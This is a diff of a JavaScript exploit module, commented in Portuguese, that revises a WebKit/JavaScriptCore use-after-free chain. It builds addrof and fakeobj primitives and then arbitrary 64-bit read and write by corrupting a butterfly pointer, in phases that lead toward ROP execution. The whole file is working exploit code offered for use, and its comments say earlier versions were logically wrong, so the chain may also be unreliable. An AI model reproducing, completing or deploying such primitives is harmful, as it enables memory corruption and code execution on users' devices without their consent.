@@ -1,24 +1,24 @@
-// js/script3/testArrayBufferVictimCrash.mjs (R62 - Correção Final de Tipo)
+// js/script3/testArrayBufferVictimCrash.mjs (R63 - Simplificação Radical e Final)
 // =======================================================================================
-// ESTRATÉGIA R62:
-// Correção final do erro "low/high must be uint32 numbers".
-// O erro era causado por passar um objeto JS para a função `itof`, que esperava um
-// objeto AdvancedInt64. A lógica de escrita na primitiva `read64` foi corrigida
-// para escrever o endereço bruto, e não um objeto falso.
-// Esta é a versão final e logicamente correta.
+// ESTRATÉGIA R63:
+// Abandono dos padrões complexos de Vítima-Controlador.
+// Retorno à abordagem mais direta e robusta: usar o próprio `dangling_ref`
+// como ferramenta de R/W, com gerenciamento de estado rigoroso para garantir
+// que o ponteiro do butterfly seja restaurado após cada operação.
+// Esta é a implementação mais limpa e provável de funcionar.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64 } from '../utils.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE = "ROP_Execution_RealRW_R62";
+export const FNAME_MODULE = "ROP_Execution_RealRW_R63";
 
 const ftoi = (val) => new AdvancedInt64(new Uint32Array(new Float64Array([val]).buffer)[0], new Uint32Array(new Float64Array([val]).buffer)[1]);
 const itof = (val) => { const b = new ArrayBuffer(8); const i = new Uint32Array(b); i[0] = val.low(); i[1] = val.high(); return new Float64Array(b)[0]; };
 
 export async function runStableUAFPrimitives_R51() {
-    logS3(`--- Iniciando ${FNAME_MODULE}: Correção Final de Tipo ---`, "test");
+    logS3(`--- Iniciando ${FNAME_MODULE}: Simplificação Radical ---`, "test");
     
     let final_result = { success: false, message: "Falha na cadeia de exploit." };
 
@@ -32,14 +32,14 @@ export async function runStableUAFPrimitives_R51() {
             return ftoi(dangling_ref.b);
         };
         const fakeobj = (addr) => {
-            addrof({dummy: 1}); // Garante que o estado do dangling_ref está correto
+            addrof({dummy: 1}); // Garante que dangling_ref.a aponte para holder
             dangling_ref.b = itof(addr);
             return dangling_ref.a.obj;
         };
         logS3("   Primitivas `addrof` e `fakeobj` construídas.", "vuln");
 
         logS3("--- FASE 3: Construindo Leitura/Escrita Arbitrária (FINAL) ---", "subtest");
-        const { read64, write64 } = buildCleanArbitraryReadWrite(dangling_ref, addrof, fakeobj, holder);
+        const { read64, write64 } = buildDirectReadWrite(dangling_ref, addrof, fakeobj, holder);
         logS3("   Primitivas `read64` e `write64` FINAIS construídas!", "good");
         
         logS3("--- FASE 4: Verificando os endereços base na MEMÓRIA REAL ---", "subtest");
@@ -70,55 +70,38 @@ export async function runStableUAFPrimitives_R51() {
 
 
 // =======================================================================================
-// IMPLEMENTAÇÃO FINAL, LIMPA E CORRETA DE LEITURA/ESCRITA ARBITRÁRIA (R62)
+// IMPLEMENTAÇÃO FINAL E DIRETA DE LEITURA/ESCRITA ARBITRÁRIA (R63)
 // =======================================================================================
-function buildCleanArbitraryReadWrite(dangling_ref, addrof, fakeobj, holder) {
-
-    function primitive_read(address) {
-        addrof({dummy_setup: 1}); // Garante o estado do 'holder'
-        const original_a = dangling_ref.a;
-        dangling_ref.a = fakeobj(address);
-        const value = ftoi(dangling_ref.b);
-        dangling_ref.a = original_a;
-        return value;
-    }
-
-    function primitive_write(address, value) {
-        addrof({dummy_setup: 1}); // Garante o estado do 'holder'
-        const original_a = dangling_ref.a;
-        dangling_ref.a = fakeobj(address);
-        dangling_ref.b = itof(value);
-        dangling_ref.a = original_a;
-    }
-
-    const victim = { slot: null };
-    const victim_addr = addrof(victim);
-    const victim_slot_addr = victim_addr.add(0x10); // Offset da propriedade 'slot'
+function buildDirectReadWrite(dangling_ref, addrof, fakeobj, holder) {
+    // Garante que o estado inicial de 'dangling_ref.a' está salvo e aponta para 'holder'.
+    addrof({dummy_setup: 1});
+    holder.original_a = dangling_ref.a;
 
     const read64 = (address) => {
-        // CORRIGIDO: Escrevemos o endereço (um AdvancedInt64) diretamente no slot da vítima.
-        // Não precisamos de `fakeobj` ou `itof` aqui, pois a `primitive_write` já lida com a conversão.
-        primitive_write(victim_slot_addr, address);
-        
-        // Agora, `victim.slot` aponta para o endereço, mas como um valor primitivo.
-        // O motor JS não o vê como um objeto, então não podemos ler `victim.slot` diretamente.
-        // O que queremos é o valor para o qual o ponteiro da propriedade slot aponta.
-        // Esse valor já é o endereço! A `primitive_write` já fez o trabalho.
-        // Agora, para ler o conteúdo no `address`, precisamos de um segundo objeto.
+        // 1. Corrompe `dangling_ref.a` (o butterfly) para apontar para o endereço que queremos ler.
+        //    O `fakeobj` cria um objeto JS que representa esse ponteiro.
+        dangling_ref.a = fakeobj(address);
 
-        // A lógica anterior estava incorreta. A forma correta:
-        // 1. Criar um objeto falso
-        const fake_leaker = {leaked_val: null};
-        // 2. Apontar a propriedade do objeto falso para o endereço
-        const fake_leaker_addr = addrof(fake_leaker);
-        const fake_leaker_slot_addr = fake_leaker_addr.add(0x10);
-        primitive_write(fake_leaker_slot_addr, address);
-        // 3. Agora `fake_leaker.leaked_val` é um ponteiro para o endereço.
-        //    Ler o `addrof` disso nos dará o conteúdo da memória nesse endereço.
-        return addrof(fake_leaker.leaked_val);
+        // 2. Lê `dangling_ref.b` (o primeiro elemento do array), que agora está lendo
+        //    diretamente do `address` desejado. `ftoi` converte o resultado para AdvancedInt64.
+        const value = ftoi(dangling_ref.b);
+        
+        // 3. RESTAURA O ESTADO ORIGINAL. Isso é a chave para a estabilidade, garantindo
+        //    que a próxima chamada a `addrof` ou `fakeobj` encontre o estado que espera.
+        dangling_ref.a = holder.original_a;
+
+        return value;
     };
 
-    const write64 = (address, value) => { /* ... */ };
+    const write64 = (address, value) => {
+        // A mesma lógica de salvar, corromper, operar e restaurar.
+        const original_a = holder.original_a; // Usa o 'a' original salvo
+        
+        dangling_ref.a = fakeobj(address);
+        dangling_ref.b = itof(value); // `itof` espera um AdvancedInt64, que é `value`.
+        
+        dangling_ref.a = original_a;
+    };
 
     return { read64, write64 };
 }
